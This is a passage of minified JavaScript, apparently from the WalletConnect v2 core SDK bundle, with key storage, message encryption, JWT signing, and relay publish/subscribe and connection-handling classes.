crypto.subtle.digest(r,e)),_7e=yX({name:"sha2-256",code:18,encode:xX("SHA-256")}),S7e=yX({name:"sha2-512",code:19,encode:xX("SHA-512")});var A7e=Object.freeze({__proto__:null,sha256:_7e,sha512:S7e});const CX=0,I7e="identity",EX=gX,T7e=r=>Ok(CX,EX(r)),k7e={code:CX,name:I7e,encode:EX,digest:T7e};var N7e=Object.freeze({__proto__:null,identity:k7e});new TextEncoder,new TextDecoder;const Oj={...E9e,...S9e,...I9e,...k9e,...$9e,...q9e,...H9e,...G9e,...X9e,...s7e};({...A7e,...N7e});function P7e(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(r):new Uint8Array(r)}function _X(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const Bj=_X("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),KS=_X("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=P7e(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),$7e={utf8:Bj,"utf-8":Bj,hex:Oj.base16,latin1:KS,ascii:KS,binary:KS,...Oj};function R7e(r,e="utf8"){const t=$7e[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r,"utf8"):t.decoder.decode(`${t.prefix}${r}`)}let O7e=class{constructor(e,t){this.core=e,this.logger=t,this.keychain=new Map,this.name=B8e,this.version=M8e,this.initialized=!1,this.storagePrefix=$d,this.init=async()=>{if(!this.initialized){const i=await this.getKeyChain();typeof i<"u"&&(this.keychain=i),this.initialized=!0}},this.has=i=>(this.isInitialized(),this.keychain.has(i)),this.set=async(i,n)=>{this.isInitialized(),this.keychain.set(i,n),await this.persist()},this.get=i=>{this.isInitialized();const n=this.keychain.get(i);if(typeof n>"u"){const{message:s}=st("NO_MATCHING_KEY",`${this.name}: ${i}`);throw new Error(s)}return n},this.del=async i=>{this.isInitialized(),this.keychain.delete(i),await this.persist()},this.core=e,this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,kQ(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?NQ(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}},B7e=class{constructor(e,t,i){this.core=e,this.logger=t,this.name=R8e,this.randomSessionIdentifier=Nk(),this.initialized=!1,this.init=async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)},this.hasKeys=n=>(this.isInitialized(),this.keychain.has(n)),this.getClientId=async()=>{this.isInitialized();const n=await this.getClientSeed(),s=Iw(n);return nC(s.publicKey)},this.generateKeyPair=()=>{this.isInitialized();const n=u6e();return this.setPrivateKey(n.publicKey,n.privateKey)},this.signJWT=async n=>{this.isInitialized();const s=await this.getClientSeed(),o=Iw(s),a=this.randomSessionIdentifier;return await nR(a,n,O8e,o)},this.generateSharedKey=(n,s,o)=>{this.isInitialized();const a=this.getPrivateKey(n),c=d6e(a,s);return this.setSymKey(c,o)},this.setSymKey=async(n,s)=>{this.isInitialized();const o=s||c9(n);return await this.keychain.set(o,n),o},this.deleteKeyPair=async n=>{this.isInitialized(),await this.keychain.del(n)},this.deleteSymKey=async n=>{this.isInitialized(),await this.keychain.del(n)},this.encode=async(n,s,o)=>{this.isInitialized();const a=rX(o),c=mu(s);if(lj(a))return p6e(c,o?.encoding);if(cj(a)){const h=a.senderPublicKey,f=a.receiverPublicKey;n=await this.generateSharedKey(h,f)}const l=this.getSymKey(n),{type:u,senderPublicKey:d}=a;return h6e({type:u,symKey:l,message:c,senderPublicKey:d,encoding:o?.encoding})},this.decode=async(n,s,o)=>{this.isInitialized();const a=m6e(s,o);if(lj(a)){const c=g6e(s,o?.encoding);return gu(c)}if(cj(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;n=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(n),l=f6e({symKey:c,encoded:s,encoding:o?.encoding});return gu(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${n}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}},this.getPayloadType=(n,s=Rf)=>{const o=Vv({encoded:n,encoding:s});return Q1(o.type)},this.getPayloadSenderPublicKey=(n,s=Rf)=>{const o=Vv({encoded:n,encoding:s});return o.senderPublicKey?Fi(o.senderPublicKey,Mo):void 0},this.core=e,this.logger=gr(t,this.name),this.keychain=i||new O7e(this.core,this.logger)}get context(){return Or(this.logger)}async setPrivateKey(e,t){return await this.keychain.set(e,t),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(Ij)}catch{e=Nk(),await this.keychain.set(Ij,e)}return R7e(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}},M7e=class extends Pwe{constructor(e,t){super(e,t),this.logger=e,this.core=t,this.messages=new Map,this.name=D8e,this.version=L8e,this.initialized=!1,this.storagePrefix=$d,this.init=async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const i=await this.getRelayerMessages();typeof i<"u"&&(this.messages=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(i){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(i)}finally{this.initialized=!0}}},this.set=async(i,n)=>{this.isInitialized();const s=Lh(n);let o=this.messages.get(i);return typeof o>"u"&&(o={}),typeof o[s]<"u"||(o[s]=n,this.messages.set(i,o),await this.persist()),s},this.get=i=>{this.isInitialized();let n=this.messages.get(i);return typeof n>"u"&&(n={}),n},this.has=(i,n)=>{this.isInitialized();const s=this.get(i),o=Lh(n);return typeof s[o]<"u"},this.del=async i=>{this.isInitialized(),this.messages.delete(i),await this.persist()},this.logger=gr(e,this.name),this.core=t}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,kQ(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?NQ(e):void 0}async persist(){await this.setRelayerMessages(this.messages)}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}};var D7e=Object.defineProperty,L7e=Object.defineProperties,U7e=Object.getOwnPropertyDescriptors,Mj=Object.getOwnPropertySymbols,j7e=Object.prototype.hasOwnProperty,F7e=Object.prototype.propertyIsEnumerable,Dj=(r,e,t)=>e in r?D7e(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Lj=(r,e)=>{for(var t in e||(e={}))j7e.call(e,t)&&Dj(r,t,e[t]);if(Mj)for(var t of Mj(e))F7e.call(e,t)&&Dj(r,t,e[t]);return r},Uj=(r,e)=>L7e(r,U7e(e));let q7e=class extends $we{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,this.events=new en.EventEmitter,this.name=U8e,this.queue=new Map,this.publishTimeout=fe.toMiliseconds(fe.ONE_MINUTE),this.initialPublishTimeout=fe.toMiliseconds(fe.ONE_SECOND*15),this.needsTransportRestart=!1,this.publish=async(i,n,s)=>{var o;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:i,message:n,opts:s}});const a=s?.ttl||Tj,c=l7(s),l=s?.prompt||!1,u=s?.tag||0,d=s?.id||Cs().toString(),h={topic:i,message:n,opts:{ttl:a,relay:c,prompt:l,tag:u,id:d,attestation:s?.attestation}},f=`Failed to publish payload, please try again. id:${d} tag:${u}`;try{const p=new Promise(async g=>{const w=({id:x})=>{h.opts.id===x&&(this.removeRequestFromQueue(x),this.relayer.events.removeListener(js.publish,w),g(h))};this.relayer.events.on(js.publish,w);const m=$f(new Promise((x,S)=>{this.rpcPublish({topic:i,message:n,ttl:a,prompt:l,tag:u,id:d,attestation:s?.attestation}).then(x).catch(T=>{this.logger.warn(T,T?.message),S(T)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${d} tag:${u}`);try{await m,this.events.removeListener(js.publish,w)}catch(x){this.queue.set(d,Uj(Lj({},h),{attempt:1})),this.logger.warn(x,x?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:d,topic:i,message:n,opts:s}}),await $f(p,this.publishTimeout,f)}catch(p){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(p),(o=s?.internal)!=null&&o.throwOnFailedPublish)throw p}finally{this.queue.delete(d)}},this.on=(i,n)=>{this.events.on(i,n)},this.once=(i,n)=>{this.events.once(i,n)},this.off=(i,n)=>{this.events.off(i,n)},this.removeListener=(i,n)=>{this.events.removeListener(i,n)},this.relayer=e,this.logger=gr(t,this.name),this.registerEventListeners()}get context(){return Or(this.logger)}async rpcPublish(e){var t,i,n,s;const{topic:o,message:a,ttl:c=Tj,prompt:l,tag:u,id:d,attestation:h}=e,f={method:r5(l7().protocol).publish,params:{topic:o,message:a,ttl:c,prompt:l,tag:u,attestation:h},id:d};Vo((t=f.params)==null?void 0:t.prompt)&&((i=f.params)==null||delete i.prompt),Vo((n=f.params)==null?void 0:n.tag)&&((s=f.params)==null||delete s.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:f});const p=await this.relayer.request(f);return this.relayer.events.emit(js.publish,e),this.logger.debug("Successfully Published Payload"),p}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,t)=>{const i=e.attempt+1;this.queue.set(t,Uj(Lj({},e),{attempt:i}));const{topic:n,message:s,opts:o,attestation:a}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${i}`),await this.rpcPublish({topic:n,message:s,ttl:o.ttl,prompt:o.prompt,tag:o.tag,id:o.id,attestation:a}),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(Ks.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(js.connection_stalled);return}this.checkQueue()}),this.relayer.on(js.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}},z7e=class{constructor(){this.map=new Map,this.set=(e,t)=>{const i=this.get(e);this.exists(e,t)||this.map.set(e,[...i,t])},this.get=e=>this.map.get(e)||[],this.exists=(e,t)=>this.get(e).includes(t),this.delete=(e,t)=>{if(typeof t>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const i=this.get(e);if(!this.exists(e,t))return;const n=i.filter(s=>s!==t);if(!n.length){this.map.delete(e);return}this.map.set(e,n)},this.clear=()=>{this.map.clear()}}get topics(){return Array.from(this.map.keys())}};var W7e=Object.defineProperty,H7e=Object.defineProperties,V7e=Object.getOwnPropertyDescriptors,jj=Object.getOwnPropertySymbols,K7e=Object.prototype.hasOwnProperty,G7e=Object.prototype.propertyIsEnumerable,Fj=(r,e,t)=>e in r?W7e(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Cb=(r,e)=>{for(var t in e||(e={}))K7e.call(e,t)&&Fj(r,t,e[t]);if(jj)for(var t of jj(e))G7e.call(e,t)&&Fj(r,t,e[t]);return r},GS=(r,e)=>H7e(r,V7e(e));let Z7e=class extends Bwe{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,this.subscriptions=new Map,this.topicMap=new z7e,this.events=new en.EventEmitter,this.name=V8e,this.version=K8e,this.pending=new Map,this.cached=[],this.initialized=!1,this.pendingSubscriptionWatchLabel="pending_sub_watch_label",this.pollingInterval=20,this.storagePrefix=$d,this.subscribeTimeout=fe.toMiliseconds(fe.ONE_MINUTE),this.initialSubscribeTimeout=fe.toMiliseconds(fe.ONE_SECOND*15),this.batchSubscribeTopicsLimit=500,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),this.clientId=await this.relayer.core.crypto.getClientId(),await this.restore()),this.initialized=!0},this.subscribe=async(i,n)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}});try{const s=l7(n),o={topic:i,relay:s,transportType:n?.transportType};this.pending.set(i,o);const a=await this.rpcSubscribe(i,s,n);return typeof a=="string"&&(this.onSubscribe(a,o),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}})),a}catch(s){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(s),s}},this.unsubscribe=async(i,n)=>{await this.restartToComplete(),this.isInitialized(),typeof n?.id<"u"?await this.unsubscribeById(i,n.id,n):await this.unsubscribeByTopic(i,n)},this.isSubscribed=async i=>{if(this.topics.includes(i))return!0;const n=`${this.pendingSubscriptionWatchLabel}_${i}`;return await new Promise((s,o)=>{const a=new fe.Watch;a.start(n);const c=setInterval(()=>{(!this.pending.has(i)&&this.topics.includes(i)||this.cached.some(l=>l.topic===i))&&(clearInterval(c),a.stop(n),s(!0)),a.elapsed(n)>=G8e&&(clearInterval(c),a.stop(n),o(new Error("Subscription resolution timeout")))},this.pollingInterval)}).catch(()=>!1)},this.on=(i,n)=>{this.events.on(i,n)},this.once=(i,n)=>{this.events.once(i,n)},this.off=(i,n)=>{this.events.off(i,n)},this.removeListener=(i,n)=>{this.events.removeListener(i,n)},this.start=async()=>{await this.onConnect()},this.stop=async()=>{await this.onDisconnect()},this.restart=async()=>{await this.restore(),await this.onRestart()},this.checkPending=async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const i=[];this.pending.forEach(n=>{i.push(n)}),await this.batchSubscribe(i)},this.registerEventListeners=()=>{this.relayer.core.heartbeat.on(Ks.pulse,async()=>{await this.checkPending()}),this.events.on(Qa.created,async i=>{const n=Qa.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()}),this.events.on(Qa.deleted,async i=>{const n=Qa.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()})},this.relayer=e,this.logger=gr(t,this.name),this.clientId=""}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}hasSubscription(e,t){let i=!1;try{i=this.getSubscription(e).topic===t}catch{}return i}reset(){this.cached=[],this.initialized=!0}onDisable(){this.cached=this.values,this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,t){const i=this.topicMap.get(e);await Promise.all(i.map(async n=>await this.unsubscribeById(e,n,t)))}async unsubscribeById(e,t,i){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}});try{const n=l7(i);await this.rpcUnsubscribe(e,t,n);const s=Hi("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,t,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}})}catch(n){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(n),n}}async rpcSubscribe(e,t,i){var n;i?.transportType===an.relay&&await this.restartToComplete();const s={method:r5(t.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:s});const o=(n=i?.internal)==null?void 0:n.throwOnFailedPublish;try{const a=this.getSubscriptionId(e);if(i?.transportType===an.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(s).catch(u=>this.logger.warn(u))},fe.toMiliseconds(fe.ONE_SECOND)),a;const c=new Promise(async u=>{const d=h=>{h.topic===e&&(this.events.removeListener(Qa.created,d),u(h.id))};this.events.on(Qa.created,d);try{const h=await $f(new Promise((f,p)=>{this.relayer.request(s).catch(g=>{this.logger.warn(g,g?.message),p(g)}).then(f)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(Qa.created,d),u(h)}catch{}}),l=await $f(c,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!l&&o)throw new Error(`Subscribing to ${e} failed, please try again`);return l?a:null}catch(a){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(js.connection_stalled),o)throw a}return null}async rpcBatchSubscribe(e){if(!e.length)return;const t=e[0].relay,i={method:r5(t.protocol).batchSubscribe,params:{topics:e.map(n=>n.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});try{await await $f(new Promise(n=>{this.relayer.request(i).catch(s=>this.logger.warn(s)).then(n)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(js.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const t=e[0].relay,i={method:r5(t.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});let n;try{n=await await $f(new Promise((s,o)=>{this.relayer.request(i).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(js.connection_stalled)}return n}rpcUnsubscribe(e,t,i){const n={method:r5(i.protocol).unsubscribe,params:{topic:e,id:t}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n}),this.relayer.request(n)}onSubscribe(e,t){this.setSubscription(e,GS(Cb({},t),{id:e})),this.pending.delete(t.topic)}onBatchSubscribe(e){e.length&&e.forEach(t=>{this.setSubscription(t.id,Cb({},t)),this.pending.delete(t.topic)})}async onUnsubscribe(e,t,i){this.events.removeAllListeners(t),this.hasSubscription(t,e)&&this.deleteSubscription(t,i),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,t){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:t}),this.addSubscription(e,t)}addSubscription(e,t){this.subscriptions.set(e,Cb({},t)),this.topicMap.set(t.topic,e),this.events.emit(Qa.created,t)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const t=this.subscriptions.get(e);if(!t){const{message:i}=st("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}deleteSubscription(e,t){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:t});const i=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(i.topic,e),this.events.emit(Qa.deleted,GS(Cb({},i),{reason:t}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(Qa.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],t=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let i=0;i<t;i++){const n=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(n)}}this.events.emit(Qa.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:t}=st("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(e.map(t=>GS(Cb({},t),{id:this.getSubscriptionId(t.topic)}))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const t=await this.rpcBatchFetchMessages(e);t&&t.messages&&(await _ye(fe.toMiliseconds(fe.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(t.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(){!this.relayer.connected&&!this.relayer.connecting&&await this.relayer.transportOpen()}getSubscriptionId(e){return Lh(e+this.clientId)}};var Y7e=Object.defineProperty,qj=Object.getOwnPropertySymbols,J7e=Object.prototype.hasOwnProperty,Q7e=Object.prototype.propertyIsEnumerable,zj=(r,e,t)=>e in r?Y7e(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Wj=(r,e)=>{for(var t in e||(e={}))J7e.call(e,t)&&zj(r,t,e[t]);if(qj)for(var t of qj(e))Q7e.call(e,t)&&zj(r,t,e[t]);return r};let X7e=class extends Rwe{constructor(e){super(e),this.protocol="wc",this.version=2,this.events=new en.EventEmitter,this.name=F8e,this.transportExplicitlyClosed=!1,this.initialized=!1,this.connectionAttemptInProgress=!1,this.hasExperiencedNetworkDisruption=!1,this.heartBeatTimeout=fe.toMiliseconds(fe.THIRTY_SECONDS+fe.FIVE_SECONDS),this.requestsInFlight=[],this.connectTimeout=fe.toMiliseconds(fe.ONE_SECOND*15),this.request=async t=>{var i,n;this.logger.debug("Publishing Request Payload");const s=t.id||Cs().toString();await this.toEstablishConnection();try{this.logger.trace({id:s,method:t.method,topic:(i=t.params)==null?void 0:i.topic},"relayer.request - publishing...");const o=`${s}:${((n=t.params)==null?void 0:n.tag)||""}`;this.requestsInFlight.push(o);const a=await this.provider.request(t);return this.requestsInFlight=this.requestsInFlight.filter(c=>c!==o),a}catch(o){throw this.logger.debug(`Failed to Publish Request: ${s}`),o}},this.resetPingTimeout=()=>{if(a7())try{clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var t,i,n;this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(n=(i=(t=this.provider)==null?void 0:t.connection)==null?void 0:i.socket)==null||n.terminate()},this.heartBeatTimeout)}catch(t){this.logger.warn(t,t?.message)}},this.onPayloadHandler=t=>{this.onProviderPayload(t),this.resetPingTimeout()},this.onConnectHandler=()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(js.connect)},this.onDisconnectHandler=()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()},this.onProviderErrorHandler=t=>{this.logger.fatal(t,`Fatal socket error: ${t?.message}`),this.events.emit(js.error,t),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()},this.registerProviderListeners=()=>{this.provider.on(Oc.payload,this.onPayloadHandler),this.provider.on(Oc.connect,this.onConnectHandler),this.provider.on(Oc.disconnect,this.onDisconnectHandler),this.provider.on(Oc.error,this.onProviderErrorHandler)},this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?gr(e.logger,this.name):Iu(ra({level:e.logger||j8e})),this.messages=new M7e(this.logger,e.core),this.subscriber=new Z7e(this,this.logger),this.publisher=new q7e(this,this.logger),this.relayUrl=e?.relayUrl||fX,this.projectId=e.projectId,lye()?this.packageName=BU():uye()&&(this.bundleId=BU()),this.provider={}}async init(){if(this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.subscriber.cached.length>0)try{await this.transportOpen()}catch(e){this.logger.warn(e,e?.message)}}get context(){return Or(this.logger)}get connected(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===1}get connecting(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===0}async publish(e,t,i){this.isInitialized(),await this.publisher.publish(e,t,i),await this.recordMessageEvent({topic:e,message:t,publishedAt:Date.now(),transportType:an.relay})}async subscribe(e,t){var i,n,s;this.isInitialized(),(!(t!=null&&t.transportType)||t?.transportType==="relay")&&await this.toEstablishConnection();const o=typeof((i=t?.internal)==null?void 0:i.throwOnFailedPublish)>"u"?!0:(n=t?.internal)==null?void 0:n.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=u=>{u.topic===e&&(this.subscriber.off(Qa.created,l),c())};return await Promise.all([new Promise(u=>{c=u,this.subscriber.on(Qa.created,l)}),new Promise(async(u,d)=>{a=await this.subscriber.subscribe(e,Wj({internal:{throwOnFailedPublish:o}},t)).catch(h=>{o&&d(h)})||a,u()})]),a}async unsubscribe(e,t){this.isInitialized(),await this.subscriber.unsubscribe(e,t)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await $f(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(t,i)=>{await this.connect(e).then(t).catch(i).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await wj())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if(e?.length===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const t=e.sort((i,n)=>i.publishedAt-n.publishedAt);this.logger.debug(`Batch of ${t.length} message events sorted`);for(const i of t)try{await this.onMessageEvent(i)}catch(n){this.logger.warn(n,"Error while processing batch message event: "+n?.message)}this.logger.trace(`Batch of ${t.length} message events processed`)}async onLinkMessageEvent(e,t){const{topic:i}=e;if(!t.sessionExists){const n=ms(fe.FIVE_MINUTES),s={topic:i,expiry:n,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(i,s)}this.events.emit(js.message,e),await this.recordMessageEvent(e)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let t=1;for(;t<6;){try{this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${t}...`),await this.createProvider(),await new Promise(async(i,n)=>{const s=()=>{n(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Oc.disconnect,s),await $f(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{n(o)}).finally(()=>{this.provider.off(Oc.disconnect,s),clearTimeout(this.reconnectTimeout),this.reconnectTimeout=void 0}),await new Promise(async(o,a)=>{const c=()=>{a(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Oc.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(Oc.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,i()})}catch(i){await this.subscriber.stop();const n=i;this.logger.warn({},n.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${t}`);break}await new Promise(i=>setTimeout(i,fe.toMiliseconds(t*1))),t++}}startPingTimeout(){var e,t,i,n,s;if(a7())try{(t=(e=this.provider)==null?void 0:e.connection)!=null&&t.socket&&((s=(n=(i=this.provider)==null?void 0:i.connection)==null?void 0:n.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o?.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new Vr(new vR(pye({sdkVersion:$k,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e){const{topic:t,message:i}=e;await this.messages.set(t,i)}async shouldIgnoreMessageEvent(e){const{topic:t,message:i}=e;if(!i||i.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${i}`),!0;if(!await this.subscriber.isSubscribed(t))return this.logger.warn(`Ignoring message for non-subscribed topic ${t}`),!0;const n=this.messages.has(t,i);return n&&this.logger.warn(`Ignoring duplicate message: ${i}`),n}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),N0(e)){if(!e.method.endsWith(q8e))return;const t=e.params,{topic:i,message:n,publishedAt:s,attestation:o}=t.data,a={topic:i,message:n,publishedAt:s,transportType:an.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(Wj({type:"event",event:t.id},a)),this.events.emit(t.id,a),await this.acknowledgePayload(e),await 